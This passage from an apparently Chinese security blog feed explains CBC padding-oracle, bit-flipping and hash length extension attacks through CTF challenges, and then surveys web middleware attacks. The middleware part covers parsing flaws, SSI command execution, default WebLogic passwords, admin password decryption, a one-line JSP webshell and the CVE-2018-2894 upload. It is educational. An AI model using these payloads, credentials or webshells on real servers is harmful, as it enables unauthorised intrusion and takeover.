r&#x3D;requests.post(url&#x3D;url,data&#x3D;post,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        print(r.text+&quot;第%s轮i&#x3D;%s &quot;%(step,i))</span><br><span class="line">        if &quot;False&quot; !&#x3D;  r.text:</span><br><span class="line">            Intermediary&#x3D;xor(chr(i),chr(step))+Intermediary</span><br><span class="line">            print(Intermediary)</span><br><span class="line">            break</span><br><span class="line">for k in range(len(Intermediary)):</span><br><span class="line">    hexs&#x3D;&quot;%&quot;+str(ord(Intermediary[k]))+hexs</span><br><span class="line">print(hexs)</span><br><span class="line">print(xor(Intermediary,IV))</span><br></pre></td></tr></table></figure><p>爆出了中间值和$flag明文</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152650.png" alt="QQ截图20210217152650"></p><p>这里有些疑惑，为啥中间值会是15位的…<br>发现$flag不是最终flag，至于接下来要做的东西，就是CBC字节翻转攻击了</p><h2 id="CBC翻转字节攻击"><a href="#CBC翻转字节攻击" class="headerlink" title="CBC翻转字节攻击"></a>CBC翻转字节攻击</h2><p>在对CBC模式加密的数据进行解密时，若iv可控，则可以任意控制解密后的内容。<br>CBC翻转字节攻击不同于padding oracle attack，后者的核心是IV可控情况下获取中间值，从而可以获得明文或者任意控制密文解密后的数据。<br>而CBC翻转字节攻击的核心思想就不是获取中间值了，而是在IV可控的情况下，通过算法缺陷来直接控制密文解密后的数据。</p><p>现在假定有中间值A,明文B1,IV C1<br>那么就有</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A^B1&#x3D;c1</span><br></pre></td></tr></table></figure><p>一点错误都没有对吧。<br>现在又假定有中间值A,我们想要解密出的明文B2和与之对应的IV C2<br>那么就有</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A^B2&#x3D;C2</span><br><span class="line">结合以上两个式子，有</span><br><span class="line">A&#x3D;B1^C1&#x3D;B2^C2</span><br><span class="line">于是有</span><br><span class="line">B2&#x3D;B1^C1^C2</span><br><span class="line">或C2&#x3D;B1^B2^C1</span><br><span class="line">若我们已知B1,C1,且C2可控,那么B2即可控</span><br><span class="line">既满足刚刚我们说的，通过算法缺陷来直接控制密文解密后的数据。</span><br></pre></td></tr></table></figure><p>这，就是CBC翻转字节攻击，没太懂没事，看例子就行了</p><h2 id="NPUCTF2020-web🐕中的CBC翻转字节攻击"><a href="#NPUCTF2020-web🐕中的CBC翻转字节攻击" class="headerlink" title="[NPUCTF2020]web🐕中的CBC翻转字节攻击"></a>[NPUCTF2020]web🐕中的CBC翻转字节攻击</h2><p>跟进我们刚刚讲的，FlagIsHere.php,核心代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X5uucFgPTVdCo9f3ZHGP8g&#x3D;&#x3D;</span><br><span class="line">&lt;?php </span><br><span class="line">#error_reporting(0);</span><br><span class="line">include(&#39;config.php&#39;);    &#x2F;&#x2F;$fl4g</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &quot;6666666&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_iv()&#123;    &#x2F;&#x2F;生成随机初始向量IV</span><br><span class="line">    $random_iv&#x3D;&#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.&#x3D;chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lalala &#x3D; &#39;piapiapiapia&#39;;</span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&#39;Identity&#39;]))&#123;</span><br><span class="line">    $_SESSION[&#39;iv&#39;] &#x3D; get_iv();</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#39;Identity&#39;] &#x3D; base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[&#39;iv&#39;]));</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode($_SESSION[&#39;iv&#39;]).&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;iv&#39;]))&#123;</span><br><span class="line">    $tmp_id &#x3D; openssl_decrypt(base64_decode($_SESSION[&#39;Identity&#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[&#39;iv&#39;]));</span><br><span class="line">    echo $tmp_id.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    if($tmp_id &#x3D;&#x3D;&#x3D;&#39;weber&#39;)die($fl4g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>此时我们已知初始IV,初始密文，且IV可控，那么CBC翻转字节攻击条件成立，可以攻击。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里贴一个别人写的python2 CBC字节反转攻击脚本</span><br><span class="line">自己拿python3写了半天都没写出很好的效果...</span><br><span class="line">import base64</span><br><span class="line">def bxor(b1, b2): # use xor for bytes</span><br><span class="line">    parts &#x3D; []</span><br><span class="line">    for b1, b2 in zip(b1, b2):</span><br><span class="line">        parts.append(bytes([b1 ^ b2]))</span><br><span class="line">    return b&#39;&#39;.join(parts)</span><br><span class="line">iv &#x3D; base64.b64decode(&quot;h34HL5RbMPw8oTaQ+P58nw&#x3D;&#x3D;&quot;)</span><br><span class="line">text &#x3D; b&quot;piapiapiapia\x04\x04\x04\x04&quot;</span><br><span class="line">result &#x3D; b&quot;weber\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&quot;</span><br><span class="line">middle &#x3D; bxor(iv,text)</span><br><span class="line">iv &#x3D; bxor(middle,result)</span><br><span class="line">print(base64.b64encode(iv))</span><br></pre></td></tr></table></figure><p>把跑出来的结果POST过去，就会得到下一步了..</p><h1 id="Hash长度扩展攻击"><a href="#Hash长度扩展攻击" class="headerlink" title="Hash长度扩展攻击"></a>Hash长度扩展攻击</h1><p>1 byte=8 bit</p><h2 id="hash算法"><a href="#hash算法" class="headerlink" title="hash算法"></a>hash算法</h2><h3 id="Merkle–Damgard构造"><a href="#Merkle–Damgard构造" class="headerlink" title="Merkle–Damgård构造"></a>Merkle–Damgård构造</h3><p>易受hash长度扩展攻击的算法有 SHA系列与MD系列，因为他们都是基于Merkle–Damgård构造。具体它是怎么结构，从下文的MD5算法可以感受到</p><h3 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a>MD5算法</h3><h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><p>MD5算法里，会先设置好一个一个的分组，每个组的大小是512bit或者说是64bytes。</p><p>每个组都包含2个部分:<br>1.数据区，占56bytes来记录需要被加密的字符串数据，当数据无法填满数据区时，会进行”补位”操作(请看下文解释)<br>2.长度描述符区,用于记录“非补位”数据的大小,占8个byte，其值为该组数据区种非补位数据的bit大小的16进制值。<br>比如非补位数据是admin,其占5个byte，40个bit，40的十六进制是28，所以其值会是28。<br>然后这个值会以一种叫做小端存储的方式记录到长度描述符区。<br>（非补位数据指该组的非填充的数据，即真正需要被加密的字符串）</p><h4 id="补位"><a href="#补位" class="headerlink" title="补位"></a>补位</h4><p>很简单，若某个组的数据长度小于56byte，该组的数据区不会被占满，那么就会自动补位来使数据区被填满。</p><p>其规则是在数据后先添加一个80字节，然后再用00字节填充完整个数据区。</p><h4 id="分组与补位小结"><a href="#分组与补位小结" class="headerlink" title="分组与补位小结"></a>分组与补位小结</h4><p>再更进一步的了解MD5算法前，需要更加深刻地理解一下分组与补位，不然稍后的理解会非常困难。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152432.png" alt="QQ截图20210217152432"></p><h4 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h4><p>这里放张自己画的加密流程的图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152445.png" alt="QQ截图20210217152445"></p><p>字符串先分组，然后第一组与初始链进行复杂数学运算得到链1.<br>注意，这里的初始链是固定的，每个MD5运算的初始链都是固定的，其值就是图中所记录的。也就是说，无论对什么数据进行MD5加密，其初始链都是</p><p>0x67452301<br>0xefcdab89<br>0x98badcfe<br>0x10325476</p><p>ok。第一组数据与初始链进行复杂运算得到链1，然后链1与第二组数据进行复杂运算得到链2，如此往复，直到倒数第二条链与最后一组数据进行复杂运算得到最后一条链(链final)</p><p>然后链final进行高低位转换就得到最终hash，那么什么是高低位转换？</p><p>如果final链是</p><ol><li>A=0x20f4847a</li><li>B=0x42e6abf8</li><li>C=0xf9097423</li><li>D=0x51a8dad4</li></ol><p>那么其hash便是 7a84f420f8abe642237409f9d4daa851</p><h2 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h2><p>基础知识掌握了，就开始了解这个重头戏了。</p><p>以一道题为切入点（改了一下实验吧的一道题）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Your cookies don&#39;t match up! STOP HACKING THIS SITE. &lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">&#x2F;&#x2F;$secret&#x3D;&quot;XXXXXXXXXXXXXXX&quot;; This secret is 15 characters long for security!</span><br><span class="line">$username&#x3D;&quot;admin&quot;;</span><br><span class="line">$password &#x3D; $_POST[&quot;password&quot;];</span><br><span class="line">if($_POST[&quot;getmein&quot;] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password)))&#123;</span><br><span class="line">    if(is_numeric(strpos($password,&quot;abc&quot;)))&#123;</span><br><span class="line">    echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">    die (&quot;The flag is &quot;. $flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo(&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo(md5($secret . urldecode($username . &quot;admin&quot;)));</span><br><span class="line">?&gt; 93a5e7bea9c040065617b1a62ffc3d72</span><br></pre></td></tr></table></figure><p>从中我们可以得知secret长度是15，md5($sercet.”adminadmin”)=93a5e7bea9c040065617b1a62ffc3d72<br>题目的意思很明显，我们需要传两个参数getmein和password使得<br>getmein=md5($secret.”admin”.password),且password包含abc字符</p><p>那么这就是hash长度扩展攻击经典的使用典例，即:<br>知道salt长度（这里secret变量的长度）<br>知道一组被加密字符串长度小于56的样本（ md5($sercet.”adminadmin”) 的值）<br>即可知道某个值与salt一起被MD5加密后的hash</p><p>那这种攻击是如何实现的呢？<br>首先我们知道了一组样本，即等于我们知道了该样本的final链（高低位变换）。<br>同时我们知道了salt长度，即等于我们可以构造出该分组。<br>那么如果我们又构造出一个新的分组，同时其上一个组是已知样本，那么与新分组进行复杂运算的就是已知样本的final链。<br>已知样本的final链，新分组的待加密字符串，即可通过复杂运算，高低位变换获得最终hash。<br>故新分组待加密字符串的hash值是可以预测的。<br>这，就是hash长度扩展攻击的原理。<br>可能还是云里雾里的，那就看如何解题吧。</p><p>因为已知salt长度，那么可以预测一下样本的分组的情况<br>因为salt+adminadmin的长度是25，那么其bit就是200，转换为16进制就是c8.<br>那么假设salt字符全为x（仅仅是个假设而已，别想太多了），该分组的情况</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152508.png" alt="QQ截图20210217152508"></p><p>那么我们可以传参<br>password=admin%80%00*30abc<br>其中abc以前的字符会在被MD5运算的时候分配到前一个组，然后通过运算获得链1，这个链1就是我们已知样本的final链了。<br>然后我们就可以预知，这个final链与abc进行复杂运算，高低位变换得到的hash了。然后再把这个hash赋值给openmein，这个题就做出来了。</p><p>好的，大致原理就是这样了。<br>这时候可以自行写脚本来找到某明文对应的MD5密文，或者使用工具:hashpump.</p><p>![</p><p>](<a href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152515.png">https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217152515.png</a>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考: &lt;a href=&quot;https://www.freebuf.com/articles/database/151167.html&quot;&gt;https://www.freebuf.com/articles/database/151167.html&lt;/a&gt;&lt;br&gt;&lt;a href=</summary>
      
    
    
    
    
    <category term="杂七杂八的安全问题" scheme="http://const27.com/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>常见中间件的攻击方式</title>
    <link href="http://const27.com/2021/06/28/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://const27.com/2021/06/28/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2021-06-28T13:52:18.718Z</published>
    <updated>2021-06-28T13:46:47.143Z</updated>
    
    <content type="html"><![CDATA[<h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><h3 id="apache文件多后缀名解析漏洞"><a href="#apache文件多后缀名解析漏洞" class="headerlink" title="apache文件多后缀名解析漏洞"></a>apache文件多后缀名解析漏洞</h3><p>与其说这是一个漏洞，不如说这是一个特性，很多程序员不知道这种特性，所以会写出有问题的代码。<br><strong>特性：多后缀名(全版本都有这个特性）</strong><br>apache在解析一个文件的后缀名时，是从右往左解析后缀名的，如果右边的后缀名不认识，就会继续向左识别，直到识别到一个认识的后缀名，但是万一都不认识呢?都不认识的话默认情况下是plain/text处理。那么apache是怎么知道哪个后缀名它是认识的呢?答案是认识的后缀名们都被记录到一个叫mime.types的文件中了。这个文件呢,Windows放在conf文件夹里，linux放在/etc/mime.types（不一定在这里，需要自己找找）,打开后是这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143402.png" alt="QQ截图20210219143402"></p><p>定义了不同的后缀名应该向浏览器返回什么样的mime格式。这里要说的是有些情况下的mime.types没有提供对php的解析方法，对php的解析规则放在另一个文件，Windows下在/conf/extra/httpd-php.conf。Linux也有这个文件在/etc/apache2/mods-enabled/php7.2.conf（或者和Windows的路径一样),打开后是这样的，定义了文件名满足什么条件(正则表达式)才会将他给php处理器处理,而且，如果你mime.types里匹配到了php后缀，但这个处理器匹配文件没有匹配成功，他还是不会把php文件进行处理</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143411.png" alt="QQ截图20210219143411"></p><p>可以试一试，确实是这样的,apache对这个文件第一个匹配到的后缀名是jpg，所以把它当作图片处理了，返回了图片类型的mime头，浏览器也就把这个文件当作图片处理，于是出现了这种情况</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143431.png" alt="QQ截图20210219143431"></p><p>当然，用这种多域名特性去解析php文件的话，就需要在上文提到的文件里去修改修改哦。</p><h3 id="apache-换行绕过"><a href="#apache-换行绕过" class="headerlink" title="apache 换行绕过"></a>apache 换行绕过</h3><p>2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><h3 id="apache-ssi远程命令执行漏洞（原理和ssi注入一样）"><a href="#apache-ssi远程命令执行漏洞（原理和ssi注入一样）" class="headerlink" title="apache ssi远程命令执行漏洞（原理和ssi注入一样）"></a>apache ssi远程命令执行漏洞（原理和ssi注入一样）</h3><p>如果服务器开启了ssi与cgi支持,即可上传shtml文件并在shtml文件中输入ssi指令 &lt;!–#exec cmd=”payload” –&gt;，如 &lt;!–#exec cmd=”ls” –&gt; ,然后再访问这个文件即可获得ls的结果</p><h1 id="iis"><a href="#iis" class="headerlink" title="iis"></a>iis</h1><h3 id="关于-的php解析漏洞-iis7-7-5解析漏洞"><a href="#关于-的php解析漏洞-iis7-7-5解析漏洞" class="headerlink" title="关于/的php解析漏洞(iis7/7.5解析漏洞)"></a>关于/的php解析漏洞(iis7/7.5解析漏洞)</h3><p>适用版本 iis7/7.5<br>前提条件:<br>1.php.ini里的cgi.fix_pathinfo设置为1,且结合方式是fast-cgi</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143527.png" alt="QQ截图20210219143527"></p><p>2.开启Fast-CGI运行模式<br>作用: 在访问某个文件时，在路径后加 /<em>.php(这里的</em>指任意字符)，即可让服务器把把该文件当作php文件解析并返回<br>如图我在一个txt文件中写入php代码，让后访问它时在路径最后加了/a.php，它就被解析为php文件了</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143555.png" alt="QQ截图20210219143555"></p><h3 id="PUT任意文件上传漏洞"><a href="#PUT任意文件上传漏洞" class="headerlink" title="PUT任意文件上传漏洞"></a>PUT任意文件上传漏洞</h3><p>1.适用版本 iis6.0<br>2.前提条件:服务器开启了webdav服务并且设置了写入权限</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143610.png" alt="QQ截图20210219143610"></p><p>同时找到访问网站的用户是哪个并给他读取和写入权</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143648.png" alt="QQ截图20210219143648"></p><p>3.概述：用PUT方法上传文件,并尝试getshell</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143716.png" alt="QQ截图20210219143716"></p><p>上传,并且确实上传成功，但是大多数情况下无法上传php等脚本文件</p><p>这个时候我们就会想到用move方法来将txt文件转化为php文件,但直接move往往是不行的，要用到iis6.0解析漏洞，把它写成shell.php;.txt就可以了getshell了</p><h3 id="iis6畸形解析漏洞"><a href="#iis6畸形解析漏洞" class="headerlink" title="iis6畸形解析漏洞"></a>iis6畸形解析漏洞</h3><p>iis6.0环境下会把文件畸形解析: 1.在一个文件后面加;.任意后缀名：假设有个文件是a.php，我们把它改成a.php;a.txt，他还是会被解析成php文件但是因为后缀名是txt所以会绕过一些防护<br>2.在一个名为 *.php(如a.php)的文件夹下的所有文件都会被解析为php</p><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h3 id="‘-’字符解析漏洞（和iis7-7-5漏洞利用方法一致）"><a href="#‘-’字符解析漏洞（和iis7-7-5漏洞利用方法一致）" class="headerlink" title="‘/’字符解析漏洞（和iis7/7.5漏洞利用方法一致）"></a>‘/’字符解析漏洞（和iis7/7.5漏洞利用方法一致）</h3><p>url/xxx.gif/xx.php会被解析为php文件</p><p>前提条件:cgi.fix_pathinfo=1</p><h3 id="目录遍历小洞"><a href="#目录遍历小洞" class="headerlink" title="目录遍历小洞"></a>目录遍历小洞</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143839.png" alt="QQ截图20210219143839"></p><p>前提条件: nginx-conf 把这个选项改为on即可</p><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143859.png" alt="QQ截图20210219143859"></p><p>前提概要:要用到别名alias<br>作用: 当设置别名时，location后面的路径没有用/闭合时，就会引起访问 url/xx../时返回的目录是当前文件夹的上层目录<br>可见返回的目录是上层目录</p><h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><p>前提条件与产生原因:<br>1.随着业务的发展，有些网站会把<a href="http://xxx/">http://xxx</a> 重定向为<a href="https://xxx/">https://xxx</a>或<a href="http://x.com/">http://x.com</a>重定向为<a href="http://www.x.com/">http://www.x.com</a>,<br>那么这种重定向的原理在nginx上的实现方式是在location块里加入return 302 http://$host:81$uri;之类的语句，<br>这里的$host,$url都是变量。$host一般为请求头的host头部,$url一般为请求行里的路径部分 如 GET /url HTTP/1.1此处的/url部分. 2.http头部里，0d（cr）和0a（lf）字符是用来分割请求头部区域的字符。头部的行是以一个crlf来分割的，也就是说请求头部每个行之间都存在着一个crlf字符来分割它们，让他们成为多个独立的行。头部与body之间有两个crlf来分割<br>作用:当某台nginx设置了形如return 302 http://$host:80$uri; 这种配置时，url是我们完全可控的，所以可以在url中人为构造crlf字符来实现分行，从而在响应头中注入我们想要得到的响应头部。<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144020.png" alt="QQ截图20210219144020"></p><h3 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h3><p>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7<br>url/xxxxx.gif%20 的文件<br>被 url/xxxxx.gif%20\0x00.php (\0x00须在burp里的hex里改)<br>需开启fastcgi</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144109.png" alt="QQ截图20210219144109"></p><p>然后发包请求这个文件,并且在请求时做点手脚<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144302.png" alt="QQ截图20210219144302"></p><h1 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h1><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User IDsystem</span><br><span class="line">Passwordpassword</span><br><span class="line">LevelAdministrator</span><br><span class="line"></span><br><span class="line">User IDweblogic</span><br><span class="line">Passwordweblogic</span><br><span class="line">LevelAdministrator</span><br><span class="line"></span><br><span class="line">User IDweblogic</span><br><span class="line">Passwordweblogic</span><br><span class="line"></span><br><span class="line">User IDadmin</span><br><span class="line">Passwordsecurity</span><br><span class="line"></span><br><span class="line">User IDjoe</span><br><span class="line">Passwordpassword</span><br><span class="line"></span><br><span class="line">User IDmary</span><br><span class="line">Passwordpassword</span><br><span class="line"></span><br><span class="line">User IDsystem</span><br><span class="line">Passwordsecurity</span><br><span class="line"></span><br><span class="line">User IDwlcsystem</span><br><span class="line">Passwordwlcsystem</span><br><span class="line"></span><br><span class="line">User IDwlpisystem</span><br><span class="line">Passwordwlpisystem</span><br></pre></td></tr></table></figure><h2 id="任意文件读取基础上的后台密码破解"><a href="#任意文件读取基础上的后台密码破解" class="headerlink" title="任意文件读取基础上的后台密码破解"></a>任意文件读取基础上的后台密码破解</h2><p>假设我们能前台任意文件读取,但是后台的账户密码是加密的.如何破解<br>weblogic新版本用的是AES加密，老版本用的是3DES加密<br>都是对称加密，有密钥就可解</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152611.png" alt="QQ截图20210219152611"></p><p>假设前台可以任意文件读取，那么我们只要用到用户的密文和加密的密钥即可破解。这两个文件在base_domain下, 为./security/<code>SerializedSystemIni.dat</code>和<code>config/config.xml</code><br>这里值得一提的是,.dat文件是二进制文件,建议burp打开不然容易乱码</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152627.png" alt="QQ截图20210219152627"></p><p>把二进制信息copy to file保存下来.</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152644.png" alt="QQ截图20210219152644"></p><p>获取config.xml</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152706.png" alt="QQ截图20210219152706"></p><p>xml文档里这才是管理员账户<br>开始解密，这里使用的是 <a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a> 中的tools5</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152715.png" alt="QQ截图20210219152715"></p><p>解密成功。登录就完事了</p><h2 id="后台传木马提权"><a href="#后台传木马提权" class="headerlink" title="后台传木马提权"></a>后台传木马提权</h2><p>后台传jsp木马的war包就行了<br>怎么生成war包:<br>jar cvf shell.war 木马源文件</p><p>部署-》安装-》上载文件-》选择文件选择war包-》一直下一步然后完成</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152726.png" alt="QQ截图20210219152726"></p><p>访问war包目录下的木马文件即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152737.png" alt="QQ截图20210219152737"></p><p>马子是一句话马子 &lt;%Runtime.getRuntime.exec(request.getParameter(“cmd”));%&gt;<br>命令建议用这个网站编码一下，不然有可能不会执行 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><h2 id="weblogic-uudi组件造成的端口探测"><a href="#weblogic-uudi组件造成的端口探测" class="headerlink" title="weblogic uudi组件造成的端口探测"></a>weblogic uudi组件造成的端口探测</h2><p>若weblogic加载了uudi组件，那么在 /uddiexplorer/SearchPublicRegistries.jsp 会存在端口探测问题</p><p>对该jsp传参</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001   </span><br></pre></td></tr></table></figure><p>我们通过改变operator的端口发包，看页面变化即可端口探测</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152757.png" alt="QQ截图20210219152757"></p><p>端口不存在，就会有could not connect over HTTP to server:</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152808.png" alt="QQ截图20210219152808"></p><p>存在就有404 error code (Not Found). Please ensure that your URL is correct,</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152816.png" alt="QQ截图20210219152816"></p><h2 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h2><p>WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do</p><p>影响版本 Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。</p><p>前提条件:管理员在后台 -&gt;base_domain-&gt;配置-&gt;一般信息-&gt;高级，把这个勾选了</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152829.png" alt="QQ截图20210219152829"></p><p>开启后我们来到 <a href="http://ip:port/ws_utc/config.do">http://ip:port/ws_utc/config.do</a> ，把这个改为<br>路径 /user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152840.png" alt="QQ截图20210219152840"></p><p>然后点安全，再点添加，把我们的jsp马传上去</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152904.png" alt="QQ截图20210219152904"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152915.png" alt="QQ截图20210219152915"></p><p>抓包，获取该木马的时间戳</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152940.png" alt="QQ截图20210219152940"></p><p>访问<br><a href="http://123.57.137.109:7001/ws_utc/css/config/keystore/%E6%97%B6%E9%97%B4%E6%88%B3_%E6%96%87%E4%BB%B6%E5%90%8D">http://123.57.137.109:7001/ws_utc/css/config/keystore/时间戳_文件名</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152951.png" alt="QQ截图20210219152951"></p><p>成功访问我的马儿<br>修复: 设置Config.do、begin.do页面登录授权后访问 ,升级，加waf</p>]]></content>
    
    
      
      
